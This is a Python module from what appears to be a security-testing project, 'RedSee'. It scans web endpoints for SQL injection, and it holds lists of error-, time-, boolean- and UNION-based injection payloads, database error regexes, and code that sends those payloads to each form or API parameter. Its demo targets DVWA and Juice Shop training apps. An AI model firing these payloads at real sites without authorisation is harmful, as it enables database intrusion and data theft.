"""
SQL Injection Scanner Module — RedSee Project
Member 3 Owner

General-purpose SQLi scanner. Works against any web target (DVWA, Juice Shop,
custom apps, REST APIs, traditional forms).

Detection techniques (run in priority order):
  1. Error-based        — SQL errors in response body
  2. Time-based blind   — response delay with database-specific sleep functions
  3. Boolean-based blind — TRUE vs FALSE response size difference
  4. UNION-based        — UNION SELECT with auto column-count enumeration

Database support: SQLite, MySQL, PostgreSQL, MSSQL, Oracle

Public API:
    from modules.sqli import scan_sqli
    findings = scan_sqli(endpoints)          # list[Endpoint] → list[Finding]
    findings = scan_sqli(endpoints, session) # With authenticated HTTPSession
"""

import time
import re
import uuid
from datetime import datetime, timezone
from typing import Optional

import requests as _requests

from schemas import Finding, Endpoint

try:
    from utils.http_helpers import HTTPSession
    _HAS_HTTP_SESSION = True
except ImportError:
    HTTPSession = None
    _HAS_HTTP_SESSION = False

# ── Agent-backed detection (engine/agent.py — sandboxed sqlmap) ─────────────
# Follows the same _has_X / resolver pattern integration.py uses for modules:
# if the agent engine can't be imported, scan_sqli falls back to the legacy
# direct-HTTP scanner below so the pipeline still runs.
try:
    from engine.agent import run_sqli_agent as _run_sqli_agent_real
    from engine.finding_map import candidate_to_finding as _candidate_to_finding_real
    from engine.report_io import write_outputs as _write_outputs_real
    from engine.llm import load_llm_config as _load_llm_config_real, LLMError as _LLMError
    _HAS_AGENT = True
except ImportError:
    _HAS_AGENT = False


# ═══════════════════════════════════════════════════════════════
# PAYLOAD CONFIGURATION
# ═══════════════════════════════════════════════════════════════

ERROR_PAYLOADS = [
    "'",
    "''",
    '"',
    "`",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' #",
    "1' OR 1=1 -- ",
    "admin' -- ",
    "' OR 1=1--",
    "1 OR 1=1",
    "1' OR '1'='1' -- ",
    "1'; -- ",
    "') OR ('1'='1",
    "')) OR (('1'='1",
]

# (payload, expected_seconds, database)
TIME_PAYLOADS = [
    ("' AND SLEEP(2) -- ", 2, "MySQL"),
    ("' OR SLEEP(2) -- ", 2, "MySQL"),
    ("'; WAITFOR DELAY '0:0:2' -- ", 2, "MSSQL"),
    ("' AND pg_sleep(2) -- ", 2, "PostgreSQL"),
    ("1; SELECT SLEEP(2) -- ", 2, "MySQL"),
    ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000)))) -- ", 1, "SQLite"),
    ("1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000)))) -- ", 1, "SQLite"),
    ("' OR DBMS_LOCK.SLEEP(2) -- ", 2, "Oracle"),
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' AND 1=1 -- ", "' AND 1=2 -- "),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("')) AND (('1'='1", "')) AND (('1'='2"),
]

UNION_PAYLOADS = [
    "' UNION SELECT NULL -- ",
    "' UNION SELECT NULL,NULL -- ",
    "' UNION SELECT NULL,NULL,NULL -- ",
    "' UNION SELECT NULL,NULL,NULL,NULL -- ",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- ",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL -- ",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL -- ",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- ",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- ",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- ",
]

SQL_ERROR_PATTERNS = [
    # SQLite
    r"SQLITE_ERROR",
    r"sqlite3\.\w+error",
    r"SQLITE_MISUSE",
    r"SQLITE_CONSTRAINT",
    r"unrecognized token",
    r"near \"[^\"]+\": syntax error",
    # MySQL
    r"you have an error in your sql syntax",
    r"warning:\s*mysql",
    r"unclosed quotation mark",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"mysql_result",
    r"quoted string not properly terminated",
    r"supplied argument is not a valid mysql",
    # PostgreSQL
    r"pg_query",
    r"pg_exec",
    r"unterminated quoted string",
    r"PostgreSQL.*ERROR",
    r"ERROR:\s+syntax error",
    # MSSQL
    r"microsoft sql server",
    r"mssql_query",
    r"odbc sql server driver",
    r"SQL Server.*error",
    r"incorrect syntax near",
    # Oracle
    r"ORA-\d{5}",
    r"SQL command not properly ended",
    r"PL/SQL:",
    # Generic
    r"syntax error",
    r"sql syntax",
    r"database error",
    r"query failed",
    r"invalid query",
    r"incomplete input",
]

SQL_ERROR_REGEX = re.compile("|".join(SQL_ERROR_PATTERNS), re.IGNORECASE)

_SKIP_INPUTS = {
    "submit", "login", "btnsign", "seclev_submit",
    "user_token", "csrf_token", "csrf", "_token",
    "upload", "uploaded", "max_file_size",
    "change", "reset", "clear",
}


# ═══════════════════════════════════════════════════════════════
# PUBLIC API
# ═══════════════════════════════════════════════════════════════

def scan_sqli(endpoints: list, session=None) -> list:
    """
    Scan a list of endpoints for SQL injection vulnerabilities.

    Args:
        endpoints: list[Endpoint] — from crawler or discovery
        session:   Optional HTTPSession for authenticated requests (used only
                   by the legacy direct-HTTP scanner; the agent-backed path
                   tests through the sandboxed sqlmap tool instead).

    Returns:
        list[Finding] — one Finding per confirmed vulnerability.
        Returns empty list if nothing found (never returns None).

    Agent-backed first: drives engine.agent.run_sqli_agent (sandboxed sqlmap,
    scope-gated, budget-capped) and maps confirmed injections to Findings via
    engine.finding_map. If the agent engine can't be imported, or fails at
    runtime (LLM/scope/sandbox not configured), this transparently falls back
    to the legacy direct-HTTP scanner below so the pipeline never breaks.
    """
    if _HAS_AGENT:
        try:
            return _agent_scan_sqli(endpoints)
        except Exception as exc:
            print(f"[SQLi] agent-backed scan failed ({exc}); falling back to legacy scanner")
    return _legacy_scan_sqli(endpoints, session)


def _agent_scan_sqli(endpoints: list) -> list:
    """Run the sandboxed SQLi agent and map confirmed injections to Findings.

    ONLY status=="injectable" candidates become Findings — clean/error/
    out_of_scope candidates never do (see engine/finding_map.py). Also writes
    the findings/SARIF/run.json audit trail via engine.report_io, under this
    call's own scan_id (never colliding with integration.py's own
    findings_{scan_id}.json, which uses the pipeline's scan_id, not this one).
    """
    if not endpoints:
        return []

    scan_id = f"sqli-{uuid.uuid4().hex[:8]}"
    target_url = getattr(endpoints[0], "url", None) or ""

    result = _run_sqli_agent_real(endpoints)

    findings = [
        _candidate_to_finding_real(c, target_url=target_url, scan_id=scan_id)
        for c in result.candidates
        if c.status == "injectable"
    ]

    llm_meta = None
    try:
        cfg = _load_llm_config_real()
        llm_meta = {"provider": cfg.base_url, "model": cfg.model, "max_usd": cfg.max_usd}
    except _LLMError:
        pass

    try:
        _write_outputs_real(result, findings, scan_id=scan_id,
                            target_url=target_url, llm_meta=llm_meta)
    except OSError as exc:
        print(f"[SQLi] warning: failed to write agent audit outputs: {exc}")

    return findings


def _legacy_scan_sqli(endpoints: list, session=None) -> list:
    """Original direct-HTTP SQLi scanner (error/time/boolean/UNION probing).

    Used as the fallback when the agent engine is unavailable or fails, and
    exercised directly by tests that force that path.
    """
    findings = []
    tested = set()

    print(f"[SQLi] Starting scan — {len(endpoints)} endpoints")

    for endpoint in endpoints:
        if not endpoint.inputs:
            continue

        testable = _get_testable_inputs(endpoint)
        if not testable:
            continue

        for param in testable:
            key = (endpoint.url, endpoint.method, param)
            if key in tested:
                continue
            tested.add(key)

            print(f"[SQLi] Testing {endpoint.method} {endpoint.url} → '{param}'")

            finding = _test_error_based(endpoint, param, session)
            if finding:
                findings.append(finding)
                print(f"  🔴 Error-based SQLi confirmed in '{param}'")
                continue

            finding = _test_time_based(endpoint, param, session)
            if finding:
                findings.append(finding)
                print(f"  🔴 Time-based blind SQLi confirmed in '{param}'")
                continue

            finding = _test_boolean_based(endpoint, param, session)
            if finding:
                findings.append(finding)
                print(f"  🔴 Boolean-based blind SQLi confirmed in '{param}'")
                continue

            finding = _test_union_based(endpoint, param, session)
            if finding:
                findings.append(finding)
                print(f"  🔴 UNION-based SQLi confirmed in '{param}'")
                continue

            print(f"  ✅ Clean — no SQLi in '{param}'")

    print(f"\n[SQLi] Done — {len(findings)} vulnerabilities found")
    return findings


# ═══════════════════════════════════════════════════════════════
# TECHNIQUE 1: ERROR-BASED
# ═══════════════════════════════════════════════════════════════

def _test_error_based(endpoint, param: str, session) -> Optional[Finding]:
    for payload in ERROR_PAYLOADS:
        try:
            response = _send(endpoint, param, payload, session)
            if response is None:
                continue

            body = response.text if hasattr(response, "text") else ""
            body_lower = body.lower()
            match = SQL_ERROR_REGEX.search(body_lower)

            if match:
                matched = match.group()[:150]
                return Finding(
                    type="SQLi",
                    url=endpoint.url,
                    parameter=param,
                    payload=payload,
                    evidence=f"SQL error in response: '{matched}'",
                    severity="Critical",
                    timestamp=_ts(),
                )

            # Also check HTTP status for 500 errors that indicate SQL failure
            if response.status_code == 500 and len(body) < 5000:
                match2 = SQL_ERROR_REGEX.search(body_lower)
                if match2:
                    return Finding(
                        type="SQLi",
                        url=endpoint.url,
                        parameter=param,
                        payload=payload,
                        evidence=f"HTTP 500 with SQL error: '{match2.group()[:150]}'",
                        severity="Critical",
                        timestamp=_ts(),
                    )

        except Exception:
            continue

    return None


# ═══════════════════════════════════════════════════════════════
# TECHNIQUE 2: TIME-BASED BLIND
# ═══════════════════════════════════════════════════════════════

def _test_time_based(endpoint, param: str, session) -> Optional[Finding]:
    try:
        t0 = time.time()
        _send(endpoint, param, "1", session)
        baseline = time.time() - t0
    except Exception:
        baseline = 0.5

    # Use a dynamic threshold: if baseline is already slow, be more lenient
    threshold = max(1.0, baseline * 3)

    for payload, expected_delay, db_name in TIME_PAYLOADS:
        try:
            t0 = time.time()
            _send(endpoint, param, payload, session)
            elapsed = time.time() - t0

            actual_delay = elapsed - baseline

            # For SQLite heavy ops, 80% of expected; for explicit SLEEP, 60%
            ratio = 0.6 if "SLEEP" in payload or "WAITFOR" in payload or "pg_sleep" in payload else 0.4
            min_delay = expected_delay * ratio

            if actual_delay >= min_delay:
                return Finding(
                    type="SQLi",
                    url=endpoint.url,
                    parameter=param,
                    payload=payload,
                    evidence=(
                        f"Time-based blind SQLi ({db_name}): baseline {baseline:.2f}s, "
                        f"with payload {elapsed:.2f}s "
                        f"(delay {actual_delay:.2f}s, threshold ≥{min_delay:.1f}s)"
                    ),
                    severity="High",
                    timestamp=_ts(),
                )
        except Exception:
            continue

    return None


# ═══════════════════════════════════════════════════════════════
# TECHNIQUE 3: BOOLEAN-BASED BLIND
# ═══════════════════════════════════════════════════════════════

def _test_boolean_based(endpoint, param: str, session) -> Optional[Finding]:
    for true_pl, false_pl in BOOLEAN_PAYLOADS:
        try:
            r_true  = _send(endpoint, param, true_pl,  session)
            r_false = _send(endpoint, param, false_pl, session)

            if r_true is None or r_false is None:
                continue

            t_len = len(r_true.text  if hasattr(r_true,  "text") else "")
            f_len = len(r_false.text if hasattr(r_false, "text") else "")

            # Also compare status codes — different status codes = strong signal
            t_status = r_true.status_code if hasattr(r_true, "status_code") else 0
            f_status = r_false.status_code if hasattr(r_false, "status_code") else 0
            status_diff = t_status != f_status

            # Content-Length header difference
            t_cl = int(r_true.headers.get("Content-Length", 0) or 0)
            f_cl = int(r_false.headers.get("Content-Length", 0) or 0)
            cl_diff = abs(t_cl - f_cl) > 20

            diff = abs(t_len - f_len)
            avg = (t_len + f_len) / 2 if (t_len + f_len) > 0 else 1

            if avg > 0 and (diff / avg) > 0.10:
                return Finding(
                    type="SQLi",
                    url=endpoint.url,
                    parameter=param,
                    payload=f"TRUE: {true_pl} | FALSE: {false_pl}",
                    evidence=(
                        f"Boolean-based blind SQLi: TRUE={t_len}B (status {t_status}), "
                        f"FALSE={f_len}B (status {f_status}), "
                        f"diff={diff}B ({(diff/avg)*100:.0f}%)"
                    ),
                    severity="High",
                    timestamp=_ts(),
                )

            # Strong signal: different HTTP status codes + size difference
            if status_diff and diff > 30:
                return Finding(
                    type="SQLi",
                    url=endpoint.url,
                    parameter=param,
                    payload=f"TRUE: {true_pl} | FALSE: {false_pl}",
                    evidence=(
                        f"Boolean-based blind SQLi: TRUE status={t_status}, "
                        f"FALSE status={f_status}, size diff={diff}B"
                    ),
                    severity="High",
                    timestamp=_ts(),
                )

        except Exception:
            continue

    return None


# ═══════════════════════════════════════════════════════════════
# TECHNIQUE 4: UNION-BASED
# ═══════════════════════════════════════════════════════════════

def _test_union_based(endpoint, param: str, session) -> Optional[Finding]:
    try:
        baseline_r = _send(endpoint, param, "1", session)
        if baseline_r is None:
            return None
        baseline_text = baseline_r.text if hasattr(baseline_r, "text") else ""
        baseline_status = baseline_r.status_code if hasattr(baseline_r, "status_code") else 0
    except Exception:
        return None

    for payload in UNION_PAYLOADS:
        try:
            r = _send(endpoint, param, payload, session)
            if r is None:
                continue

            body = r.text if hasattr(r, "text") else ""
            status = r.status_code if hasattr(r, "status_code") else 0
            body_lower = body.lower()

            has_error = bool(SQL_ERROR_REGEX.search(body_lower))
            size_changed = abs(len(body) - len(baseline_text)) > 50
            status_ok = status == 200
            no_longer_error = (baseline_status >= 400 and status == 200)

            # Success: no SQL error AND (size changed OR status went from error to OK)
            if not has_error and (size_changed or no_longer_error):
                null_count = payload.count("NULL") or payload.count(",") + 1
                return Finding(
                    type="SQLi",
                    url=endpoint.url,
                    parameter=param,
                    payload=payload,
                    evidence=(
                        f"UNION-based SQLi ({null_count}-column UNION). "
                        f"Response changed from {len(baseline_text)}B (status {baseline_status}) "
                        f"to {len(body)}B (status {status}) without SQL error."
                    ),
                    severity="Critical",
                    timestamp=_ts(),
                )
        except Exception:
            continue

    return None


# ═══════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════

def _detect_api_type(response) -> str:
    """Detect if response is JSON API or HTML."""
    if response is None:
        return "unknown"
    ct = response.headers.get("Content-Type", "")
    if "json" in ct:
        return "json"
    if "html" in ct:
        return "html"
    # Heuristic: if body starts with { or [, it's probably JSON
    body = (response.text or "")[:50].strip()
    if body.startswith("{") or body.startswith("["):
        return "json"
    return "html"


def _send(endpoint, param: str, payload: str, session):
    """
    Send HTTP request with payload injected into target parameter.
    Auto-detects form-encoded vs JSON API style.
    """
    try:
        form_data = {}
        for name in endpoint.inputs:
            if name == param:
                form_data[name] = payload
            elif name.lower() in ("submit", "login", "btnsign", "btnsubmit"):
                form_data[name] = "Submit"
            else:
                form_data[name] = "1"

        kwargs = {"timeout": 15, "allow_redirects": True}

        if session and _HAS_HTTP_SESSION:
            if endpoint.method.upper() == "POST":
                return session.post(endpoint.url, data=form_data)
            else:
                return session.get(endpoint.url, params=form_data)
        else:
            if endpoint.method.upper() == "POST":
                # Try form-encoded first, also try JSON for API endpoints
                r = _requests.post(endpoint.url, data=form_data, **kwargs)
                if r.status_code not in (415, 400):
                    return r
                # Fallback: try JSON
                return _requests.post(endpoint.url, json=form_data, **kwargs)
            else:
                return _requests.get(endpoint.url, params=form_data, **kwargs)

    except Exception:
        return None


def _get_testable_inputs(endpoint) -> list:
    return [n for n in endpoint.inputs if n.lower() not in _SKIP_INPUTS]


def _ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# ═══════════════════════════════════════════════════════════════
# CLI QUICK TEST
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import sys, os
    try:
        from dotenv import load_dotenv
        load_dotenv()
    except ImportError:
        pass

    target = os.getenv("TARGET_URL", "http://localhost")

    from schemas import Endpoint
    test_endpoints = [
        Endpoint(
            url=f"{target}/rest/products/search",
            method="GET",
            form_action=None,
            inputs=["q"],
            cookies_needed=[],
            endpoint_type="api",
        ),
        Endpoint(
            url=f"{target}/vulnerabilities/sqli/",
            method="GET",
            form_action="#",
            inputs=["id", "Submit"],
            cookies_needed=["PHPSESSID", "security"],
            endpoint_type="form",
        ),
        Endpoint(
            url=f"{target}/vulnerabilities/sqli_blind/",
            method="GET",
            form_action="#",
            inputs=["id", "Submit"],
            cookies_needed=["PHPSESSID", "security"],
            endpoint_type="form",
        ),
    ]

    print("=" * 60)
    print("RedSee — SQLi Scanner")
    print(f"Target: {target}")
    print("=" * 60)

    # This CLI demo exercises the legacy direct-HTTP scanner specifically
    # (not the agent-backed path, which needs REDSEE_* scope/LLM config and
    # a sandboxed sqlmap) — call it directly so the demo is deterministic.
    try:
        from utils.http_helpers import HTTPSession
        session = HTTPSession(target)
        session.authenticate_dvwa()
        findings = _legacy_scan_sqli(test_endpoints, session=session)
    except ImportError:
        print("HTTPSession not available — running unauthenticated")
        findings = _legacy_scan_sqli(test_endpoints)

    print(f"\n{'='*60}")
    print(f"📋 {len(findings)} SQLi finding(s):")
    for f in findings:
        print(f"  🔴 [{f.severity}] {f.url} → param='{f.parameter}'")
        print(f"     Payload:  {f.payload}")
        print(f"     Evidence: {f.evidence}")
    print(f"{'='*60}")